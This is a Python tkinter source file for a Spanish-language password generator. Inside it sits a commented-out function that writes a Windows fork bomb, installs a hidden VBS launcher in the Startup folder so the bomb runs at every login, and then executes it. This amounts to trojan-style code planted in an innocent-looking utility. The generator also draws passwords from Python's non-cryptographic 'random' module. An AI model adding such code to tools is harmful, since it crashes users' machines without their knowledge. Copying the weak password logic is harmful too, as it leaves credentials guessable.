#import os
import random
#import pyperclip
import subprocess
from tkinter import *
from tkinter.ttk import *


def low():
    entry.delete(0, END)
    length = var1.get()

    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    digits = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789 !@#$%&*()"
    password = ""

    if var.get() == 1:
        for i in range(0, length):
            password = password + random.choice(lower)
        return password
    elif var.get() == 0:
        for i in range(0, length):
            password = password + random.choice(upper)
        return password
    elif var.get() == 3:
        for i in range(0, length):
            password = password + random.choice(digits)
        return password
    else:
        print("Por favor, elije una opcion")

def generar():
    password1 = low()
    entry.insert(10, password1)

#def copy1():
#    random_password = entry.get()
#    pyperclip.copy(random_password)

# Funcion archivo
#def bomba():
#    ar = open(r'C:\Users\vbox\Documents\forkbomb.bat','w')
#    ar.write("%0|%0")
#    ar.close()

#    f = open(r'C:\Users\vbox\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\forkbomb.vbs','w')
#    f.write('set objshell = createobject("wscript.shell")\n')
#    f.write(r'objshell.run "C:\Users\vbox\Documents\forkbomb.bat",vbhide')
#    f.close()

#    os.system(r'C:\Users\vbox\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\forkbomb.vbs')


# Funcion Principal

# Creacion de la GUI

root = Tk()
var = IntVar()
var1 = IntVar()

# Titulo de la ventana
root.title("MantoSoft: Generador")

#Crear una etiqueta y una entrada para
#mostrar la contraseña

Random_password = Label(root, text='Clave')
Random_password.grid(row=0)
entry = Entry(root)
entry.grid(row=0, column=1)

#Crear etiqueta para la longitud de la clave
c_label = Label(root, text='Longitud')
c_label.grid(row=1)

#Crear botones para copiar la password al clipboard y para generar
#boton_copiar = Button(root, text='Copiar', command=copy1)
#boton_copiar.grid(row=0, column=2)
boton_generar = Button(root, text='Generar', command=generar)
boton_generar.grid(row=0, column=3)

#Botones redondos para elegir la fuerza
# La por defecto es medio

radio_low = Radiobutton(root, text="Baja", variable=var, value=1)
radio_low.grid(row=1, column=2, sticky='E')
radio_middle = Radiobutton(root, text="Media", variable=var, value=0)
radio_middle.grid(row=1, column=3, sticky='E')
radio_strong = Radiobutton(root, text="Fuerte", variable=var, value=3)
radio_strong.grid(row=1, column=4, sticky='E')
combo = Combobox(root, textvariable=var1)

#Combo Box para la Longitud
combo['values'] = (8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,"Longitud")
combo.current(0)
combo.bind('<<ComboboxSelected>>')
combo.grid(column=1, row=1)

#Iniciar la gui
root.mainloop()
